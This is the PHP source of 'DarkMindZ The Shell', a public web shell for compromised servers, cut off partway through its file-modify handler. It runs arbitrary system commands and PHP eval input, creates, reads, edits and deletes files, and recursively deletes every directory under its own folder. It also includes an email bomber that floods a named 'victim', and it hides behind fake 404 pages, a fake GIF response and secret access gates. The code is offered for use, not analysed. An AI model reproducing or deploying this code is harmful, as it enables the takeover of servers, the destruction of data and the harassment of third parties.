<?php
/*---------------------------------------=========[ DarkMindZ The Shell ]=========----------------------------------*/
/*Made By --= RoMeO =--
/ Email: romeo.haxxor@gmail.com
/ WWW: www.darkmindz.com
/ --========================--
/ Version -= Public Version 1.0 =-
/ --========================--
/  Anything you edit in the coding of this shell
/   you will have to send a copy to RoMeO @ romeo@darkmindz.com or romeo.haxxor@gmail.com
/   any comments or suggestions, please use the feedback option in the shell..
/ --=[ ------------------------------------------------------------------------------------------------------------- ]=--*/
// OS Detection
$sys=strtolower(substr(PHP_OS,0,3));
$win = 0;
$linx = 0;
if ($sys == "win") {
$win = 1;
} else {
$linx = 1;
}
// End of OS Detection
//fake image - base64 encoded - thanks to R4z0rblade
$fakeimg="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";
//end of fake image
$nfile = $_POST['nfile'];
$action = $_GET['action']; // The menu, ingelo's Edit
// Shell Settings
$reqagent = $_SERVER['HTTP_USER_AGENT'];// user agent Variable
//Protection Config, choose one only, you can choose auth and fakeimage, or auth and agent, but that is it...
// Safe Mode, Idea by wolfrat
$safe = 0; // Safe Mode, the shell will not show unless the $word is used,, IE: shell.php?secret&action=index , still needs improving :)
$word = "secret";
if ($safe == 1) {
if (!isset($_GET[$word])) {
echo "
<title>404 Not Found</title>
<H1>Not Found</H1><br>
The requested URL  was not found on this server.<P>
<HR>
<ADDRESS>Apache/1.3.31 Server at ".$HTTP_SERVER_VARS["HTTP_HOST"]." Port 80</ADDRESS>";
   exit;
   }
 }
// end of Safe Mode
$fakeimage = 0; //turn fake image protection on or off
$agent = 0;// turn user agen protection on or off
$auth = 0; // turn basic auth on or off 
$adminmail='email@mail.com'; // your email, to recieve an email if someone tried to access the shell with wrong user or pass
$adminfrom='shell@darkmindz.com'; // the senders email
$safe_mode = @ini_get('safe_mode'); // assign safe_mode to get safe mode stats
// this is the email that will be sent to you when someone tries to access the shell.
$warnMsg ="
 This is DarkMindZ The Shell...
 installed on: http://".$HTTP_SERVER_VARS["HTTP_HOST"]."$PHP_SELF
 just to let you know that somebody tryed to access
 the script using wrong username or password:

 =- Date: ".date("Y-m-d H:i:s")."
 =- IP: ".$HTTP_SERVER_VARS["REMOTE_ADDR"]."
 =- User Agent: ".$HTTP_SERVER_VARS["HTTP_USER_AGENT"]."
 =- username used: $PHP_AUTH_USER
 =- password used: $PHP_AUTH_PW

 If this is not the first time it happens,
 please consider either to remove the shell
 from your system or change it's name or
 directory location on your server.

 Regards...
 The DarkMindZ Staff";
// End of email
// Fake Image/User Agent
if ($fakeimage == 1) {
if ($reqagent != "agent") {
header("Content-type: image/gif");
die(base64_decode($fakeimg));
}
}
// End of fake image
// User Agent
if($agent == 1) {
if($reqagent != "romeo") {
die("
<title>404 Not Found</title>
<H1>Not Found</H1><br>
The requested URL  was not found on this server.<P>
<HR>
<ADDRESS>Apache/1.3.31 Server at ".$HTTP_SERVER_VARS["HTTP_HOST"]." Port 80</ADDRESS>");
}
}
// End of User Agent Protection
// Basic Auth
if($auth == 1) {
$username = "dXNlcg";// Base64 Encoded User, N00b Killer xD
$password = "cGFzcw";// Base64 Encoded Pass, ^^

if (!isset($_SERVER['PHP_AUTH_USER'])) {

header('WWW-Authenticate: Basic realm="'.$HTTP_SERVER_VARS["HTTP_HOST"].'"');
header('HTTP/1.0 404 Not Found');
echo "
<title>404 Not Found</title>
<H1>Not Found</H1><br>
The requested URL  was not found on this server.<P>
<HR>
<ADDRESS>Apache/1.3.31 Server at ".$HTTP_SERVER_VARS["HTTP_HOST"]." Port 80</ADDRESS>
";
exit();

} else {

if (($_SERVER['PHP_AUTH_USER'] == (base64_decode($username))) && ($_SERVER['PHP_AUTH_PW'] == (base64_decode($password)))) {

} else {
header('HTTP/1.0 404 Not Found');

mail($adminmail,"DarkMindZ WARNING!",$warnMsg,"From: $adminfrom\nX-Mailer:DarkMindZ AutoWarn System");// emails the warning email...
echo "
<H1>Not Found</H1><br>
The requested URL  was not found on this server.<P>
<HR>
<ADDRESS>Apache/1.3.31 Server at ".$HTTP_SERVER_VARS["HTTP_HOST"]." Port 80</ADDRESS>
";
exit();

 }

   }

    }
// End of config, anything you edit after this point need to be reported to RoMeO
?>
<html>
<head>
<!-- Copyrights reserved for RoMeO || DarkMindZ.com -->
<title><?php echo base64_decode("LS09IERhcmtNaW5kWiB8fCBUaGUgU2hlbGwgPS0t") ?></title>
<style>
BODY
{
	SCROLLBAR-FACE-COLOR: #000000;
	SCROLLBAR-HIGHLIGHT-COLOR: #000000;
	SCROLLBAR-SHADOW-COLOR: #000000;
	COLOR: #CCCCCC;
	SCROLLBAR-3DLIGHT-COLOR: #726456;
	SCROLLBAR-ARROW-COLOR: #726456;
	SCROLLBAR-TRACK-COLOR: #292929;
	FONT-FAMILY: Verdana;
	SCROLLBAR-DARKSHADOW-COLOR: #726456;
	background-color: #1B1B1D;
	border-top-color: #00FF00;
	border-right-color: #00CC00;
	border-bottom-color: #009900;
	border-left-color: #006600;
	font-size: small;
}
td 
{ 
color: #cccccc;;
}
.grey 
{
color: #999999;
}
input 
{ BACKGROUND-COLOR: #333333; 
font: small tahoma; 
color: #00ff00;;
}
.txtbox 
{ BACKGROUND-COLOR: #333333; 
color: #00ff00; 
font-family: "Fixedsys bold";
border-style: solid;
border-width: 1px;
}
.menu {
	font-family: terminal;
	font-size: xx-small;
	font-style: normal;
	font-weight: lighter;
	color: #666666;
}
a:link     {color: #00CC00; text-decoration: none;}
a:active   {color: #00FF00; text-decoration: none;}
a:visited  {color: #999999; text-decoration: none;}
a:hover    {color: #00FF00; text-decoration: none;}
textarea {
   background-color: #333333;
   border-style: solid;
   border-width: 1px;
   font-family: verdana, arial, sans-serif;
   font-size: 11px;
   color: #00ff00;
   padding: 0px;
   }

</style>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body text="#333333" link="#CCCCCC">
<table width="100%" height="91" border="2" align="center" cellpadding="3" cellspacing="3">
  <tr> 
    <td height="25" bgcolor="#000000"><div align="center"> 
        <p>
<font size="-2">--=| Safe-Mode: <?php echo (($safe_mode)?("<font color=#008000>ON!!</font>"):("<font color=red>OFF!!</font>"));?> || 
					Server IP: <?php echo '<b>'.gethostbyname($_SERVER["HTTP_HOST"]).'</b>'?> || 
					Your IP: <?php echo '<b>'.$_SERVER["REMOTE_ADDR"].'</b>'?> || 
					Shell Folder: <?php echo '<b>'.$_SERVER['SCRIPT_FILENAME']/* ADDED A $_SEVER['SCRIPTFILENAME'] instead of $SCRIPT_FILENAME*/. '</b>' ?>&nbsp;|=--</font></p>
      </div>
	</td>
  </tr>
  <tr> 
    <td height="25" bgcolor="#000000"><div align="center"><font size="-2">
	<a href="?action=index">Home</a> || 
	<a href="?action=shell">Execute code</a> || 
	<a href="?action=php"> Execute a php code </a> || 
	<a href="?action=files">Files Management</a> || 
	<a href="?action=tools">Tools</a> || 
	<a href="?action=comms">Fast Access</a> || 
	<a href="?action=infos">Server Info.</a> || 
	<a href="?action=kill">KILL IT!</a> || 
	<a href="?action=list">List of Commands</a> || 
	<a href="?action=feedback">Feedback</a> || 
	<a href="?action=about">About</a> || 
	<a href="?update">Update</a>
	</font>
	</div>
	</td>
  </tr>
</table>
<br>
<table width="67%" height="221" border="2" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="217" nowrap><font size="-2">Command </font><br>
      <textarea name="textarea" readonly style="width:100%; height:88% ;border: #33333;  background-color: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px">
	<?php
if ($action == "cmd1") {
	// Changed all by Ingelo
	if(isset($_POST['cmd1'])){
		$cmd1 = stripslashes($_POST['cmd1']);
		$check = @system($cmd1);
		if($check){
			echo $check;
		}
		else {
			echo "An Error Occured While Executing Command!";
		}
	}
	else {
		echo "You Must Specify A Command!";
	}
}
// End of Ingelo Change
	?>
     </textarea> 
    </td>
   </tr>
</table>
<br>
<tr> 
  <td width="28%" height="325"> <table width="80%" height="289" border="2" align="center" cellpadding="0" cellspacing="0" bordercolor="#666666" bgcolor="#000000">
      <tr> 
        <td height="61" colspan="2" nowrap bordercolor="#CCCCCC"> <font size="-2">Execute 
          Command:</font> <div align="center"> 
            <form name="form1" method="post" action="?action=cmd1">
              <div align="center"><font size="-1">Command:</font> 
                <input name="cmd1" type="text" size="90">
                <input type="submit" name="Submit" value="Execute">
              </div>
            </form>
          </div>
		</td>
      </tr>
      <tr align="left" valign="top"> 
        <td height="80" colspan="2" align="left" valign="top" bordercolor="#CCCCCC"> 
          <center>
          </center>
	      <?php
	// Welcome Message
	if ($action == "") {
echo base64_decode('PGNlbnRlcj48aDI+LS09WyBEYXJrTWluZFogfHwgVGhlIFNoZWxsIF09LS08aDI+PC9jZW50ZXI+PC8gYnI+PGNlbnRlcj48aDM+LS09IEJ5IFJvTWVPID0tLTwvaDM+PC9jZW50ZXI+');
	}	  
	elseif ($action == "index") {
echo base64_decode('PGNlbnRlcj48aDI+LS09WyBEYXJrTWluZFogfHwgVGhlIFNoZWxsIF09LS08aDI+PC9jZW50ZXI+PC8gYnI+PGNlbnRlcj48aDM+LS09IEJ5IFJvTWVPID0tLTwvaDM+PC9jZW50ZXI+');
		}
	?>
          <?php
//feedback
	if ($action == "feedback") {
echo '<center><form method="POST" action="?action=feedgo"></center><br>';
echo 'Name:<br>';
echo '<center><input type="text" name="fromemail" size="30" value=""></center><br>';
echo 'Suggestions - Comments:<br>';
echo '<center><textarea name="suggestion" cols="40" rows="6" wrap="VIRTUAL"></textarea></center><br>';
echo '<center><input name="submit" type="submit" value="Send Email"></center>';
echo '</form>';
 echo "</table>";
 exit;
	} elseif ($action == "feedgo") {
$from="feedback@darkmindz.com";
$to="romeo.haxxor@gmail.com";
$suggestion = $_POST['suggestion'];
echo '<center>Success!, Email sent to: <b> RoMeO </b>...<br></center>';
mail($to,"Feedback",$suggestion,"From: $from\nX-Mailer:DarkMindZ FeedBack System");
 echo "</table>";
 exit;
}
	?>
          <?php
// start of calls
// shell code
	if ($action == "shell") {
echo '<center>Enter shell code to execute: </center>';
echo '<center><form method="POST" action="?action=shellgo"></center>';
echo '<center><textarea name="cmd" cols="50" rows="10"></textarea><br></center>';
echo '<center><input type="submit" value="Execute"></form></center>';
 echo "</table>";
 exit;
	} elseif ($action == "shellgo") {
$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);
echo '<center>The shell code <b>'.$cmd.'</b> has been executed on server.<br></center>';
echo '<center>The server responded:<br><br>';
system($cmd);
 echo "</table>";
 exit;
}
// End of Shell Code
?>
          <?php
//server info
	if ($action == "infos") {
echo 'Server information<br><br>';
echo 'Shell file:<b> '.$_SERVER['SCRIPT_NAME'].'</b><br>'; // Made $_SERVER['SCRIPT_NAME'] instead of $STRIP_NAME
echo 'Shell URL:<b> '.$_SERVER['SCRIPT_FILENAME'].'</b><br>'; // Done the same with all the things down here. added $_SERVER['COMMAND_HERE'].
echo 'OS & PhpVersion:<b> '.$_SERVER['SERVER_SOFTWARE'].'</b><br>';
echo 'Admin Email:<b> '.$_SERVER['SERVER_ADMIN'].'</b><br>';
echo 'Server name:<b> '.$_SERVER['SERVER_NAME'].'</b><br>';
echo 'Server cookie:<b> <script>document.write(document.cookie)</script></b><br>';
echo 'Server ip:<b> '.$_SERVER['SERVER_ADDR'].'</b> (Running on port<b> '.$_SERVER['SERVER_PORT'].'</b>)<br>';
echo 'CGI Version:<b> '.$_SERVER['GATEWAY_INTERFACE'].'</b><br>';
echo 'Request Method:<b> '.$_SERVER['REQUEST_METHOD'].'</b><br>';
echo 'HTTP Protocol Version:<b> '.$_SERVER['SERVER_PROTOCOL'].'</b><br>';
echo 'HTTP Heading Accept:<b> '.$_SERVER['HTTP_ACCEPT'].'</b><br>';
echo 'HTTP User Agent:<b> '.$_SERVER['HTTP_USER_AGENT'].'</b><br>';
echo 'HTTP Accept Charset:<b> '.$_SERVER['HTTP_ACCEPT_CHARSET'].'</b><br>';
echo 'HTTP Accept Encodingt:<b> '.$_SERVER['HTTP_ACCEPT_ENCODING'].'</b><br>';
echo 'HTTP Accept Language:<b> '.$_SERVER['HTTP_ACCEPT_LANGUAGE'].'</b><br>';
echo 'HTTP Heading Connection Protocol:<b> '.$_SERVER['HTTP_CONNECTION'].'</b><br>';
echo 'HTTP Heading Host Protocol:<b> '.$_SERVER['HTTP_HOST'].'</b>';
echo "<br><br><br>";
 echo "</table>";
 exit;
	} else if ($action == "phpinfo") {
phpinfo();
 echo "</table>";
 exit;
}
//end of server info
	?>
          <?php
// Email Bomb, With the help of F2B
if ($action == "bomb") {
@set_time_limit(0);
@ignore_user_abort(1);

$email=$_POST['email'];
$num=$_POST['num'];
$text=$_POST['text'];
$kb=$_POST['kb'];
if (($email!="" and isset($email)) and ($num!="" and isset($num)) and ($text!="" and isset($text)) and ($kb!="" and isset($kb))) {

$num_text=strlen($text)+1;
$num_kb=(1024/$num_text)*$kb;
$num_kb=ceil($num_kb);

for ($i=1; $i<=$num_kb; $i++) {
$msg=$msg.$text." ";
}

for ($i=1; $i<=$num; $i++) {
mail($email, $text, $msg, "From: $ymail");
}

$all_kb=$num*$kb;

echo <<<EOF
<p align="center">Victim: <b><font color="lime">$email</font></b><br>
Quantity of letters: <b><font color="lime">$num</font></b><br>
Total size: <b><font color="lime">$all_kb kb</font></b><br></p>
EOF;
exit;
}

else {

echo <<<EOF
<form action="?action=bomb" method="post">
<table align="center" border="1" bordercolor="#000000">
<tr><td>To:</td><td><input type="text" name="email" value="lamer@microsoft.com" size="25"></td></tr>
<tr><td>From:</td><td><input type="text" name="ymail" value="hacker@darkmindz.com" size="25"></td></tr>
<tr><td>Number:</td><td><input type="text" name="num" value="5" size="25"></td></tr>
<tr><td>Text:</td><td><input type="text" name="text" value="--=[ BoMbEd ]=--" size="25"></td></tr>
<tr><td>Size (kb):</td><td><input type="text" name="kb" value="10" size="25"></td></tr>
<tr><td colspan="2" align="center"><input type="submit"></td></tr>
</table>
</form>
EOF;
exit;
}
}
// End of Email Bomber
	?>
          <?php
// php code
	if ($action == "php") {
echo '<center>Enter PHP code to execute:<br></center>';
echo '<center><body bgcolor="#000000" text="#00FF00"><form method="POST" action="?action=phpgo"></center>';
echo '<center><textarea name="cmd" cols="50" rows="10"></textarea><br></center>';
echo '<center><input type="submit" value="Execute"></form></center>';
 echo "</table>";
 exit;
	} else if ($action == "phpgo") {
echo '<center>---=================---<br><br></center>';
$cmd = $_POST['cmd'];
$postcmd = stripslashes($cmd);
echo '<center>The PHP code <b>'.$postcmd.'</b> has been executed.<br></center>';
echo '<center>The server responded:<br><br></center>';
$check = @eval($postcmd);
	if($check){
		echo $check;
			}
	else {
			echo "Command could not be executed!<br />";
				}
 echo "</table>";
 exit;
}
//end of php code
	?>
          <?php
// Dir Remover
	if ($action == "deldir") {
function remove_directory($dir) {
  if ($handle = opendir("$dir")) {
   while (false !== ($item = readdir($handle))) {
     if ($item != "." && $item != "..") {
       if (is_dir("$dir/$item")) {
         remove_directory("$dir/$item");
       } else {
         unlink("$dir/$item");
         echo " removing $dir/$item<br>\n";
       }
     }
   }
   closedir($handle);
   rmdir($dir);
   echo "removing $dir<br>\n";
  }
}
function folderlist(){
 $startdir = './';
// Below are folders to be excluded from our user list
 $ignoredDirectory[] = '.';// if these two are removed, the shell well delete everything!!
 $ignoredDirectory[] = '..';
  if (is_dir($startdir)){
      if ($dh = opendir($startdir)){
          while (($folder = readdir($dh)) !== false){
              if (!(array_search($folder,$ignoredDirectory) > -1)){
                if (filetype($startdir . $folder) == "dir"){
                      $directorylist[$startdir . $folder]['name'] = $folder;
                      $directorylist[$startdir . $folder]['path'] = $startdir;
                  }
              }
          }
          closedir($dh);
      }
  }
return($directorylist);
}

$folders = folderlist();
 
 foreach ($folders as $folder){
   $path = $folder['path'];
   $name = $folder['name'];


remove_directory($name); 
}
}
// End of Dir Deleter
	?>
          <?php
// file manager
	if ($action == "files") {
echo '<center>---=================---<br><br></center>';
echo '<center>Create a new file:<br><br></center>';
echo '<center><form method="POST" action="?action=filenew"></center>';
echo '<center>File name: <input type="text" name="nfile" size="30" value="your-file.txt"><br></center>';
echo '<center><input type="submit" value="Create"></form></center>';
echo '<center><center><br>---=================---<br><br></center>';
echo '<center>Delete a file:<br><br></center>';
echo '<center><form method="POST" action="?action=filedel"></center>';
echo '<center>File name: <input type="text" name="nfile" size="30" value="your-file.txt"><br></center>';
echo '<center><input type="submit" value="Delete"></form></center>';
echo '<center><br>---=================---<br><br></center>';
echo '<center>Modify a file:<br><br></center>';
echo '<center><form method="POST" action="?action=filemod"></center>';
echo '<center>File name: <input type="text" name="nfile" size="30" value="your-file.txt"><br></center>';
echo '<center><input type="submit" value="Modify"></form></center>';
echo '<center><br>---=================---<br><br></center>';
echo '<center>Read a file:<br><br>';
echo '<center><form method="POST" action="?action=fileread"></center>';
echo '<center>File name: <input type="text" name="nfile" size="30" value="your-file.txt"><br></center>';
echo '<center><input type="submit" value="Read"></form></center>';
echo '<center><br>---=================---<br><br></center></center>';
echo '<center>Rename a file:<br><br>';
echo '<center><form method="POST" action="?action=filename"></center>';
echo '<center>File name: <input type="text" name="nfile" size="30" value="your-file.txt"><br><br></center>';
echo '<center>New name: <input type="text" name="newfile" size="30" value="your-new-file.txt"><br></center>';
echo '<center><input type="submit" value="Rename"></form></center>';
echo '<center><br>---=================---<br><br></center>';
 echo "</table>";
 exit;
// Create A New FIle
	} else if ($action == "filenew") {
echo 'The file <b> '.$nfile.' </b> was created successfully!<br><br>';
$index=fopen($nfile,'a');
fwrite($index,'');
fclose($index);
 echo "</table>";
 exit;
// End of New File
// Delete File
		} else if ($action == "filedel") {
echo 'The file <b> '.$nfile.' </b>';
// EDITED BY INGELO
// unlink($nfile); THIS WAS THE OLD SCRIPT
		if(file_exists($nfile)){
	$delete_file = @unlink($nfile);
			if($delete_file){
		echo "was deleted succesfully!<br/><br/>";
			}
	else {
		echo "could not be deleted due to access.<br/><br/>";
	}
}
	else {
	echo "could not be deleted, because the file don't exists.<br/><br/>";
	}
 echo "</table>";
 exit;
// END EDIT
// End Delete File
// File Modify
	} else if ($action == "filemod") {
	echo 'Modifing <b> '.$nfile.' </b>:<br><br>';
	if(file_exists($nfile)){
		echo '<form method="POST" action="?action=filemodgo&nfile='.$nfile.'">';
		if(filesize($nfile) > 0){
			$index = fopen($nfile, "r");
			$ct = fread($index, filesize($nfile));
			$ct = htmlentities ($ct, ENT_QUOTES);
			$ct = nl2br($ct);
			echo '<textarea name="newctt" cols="50" rows="10">'.$ct.'</textarea><br>';
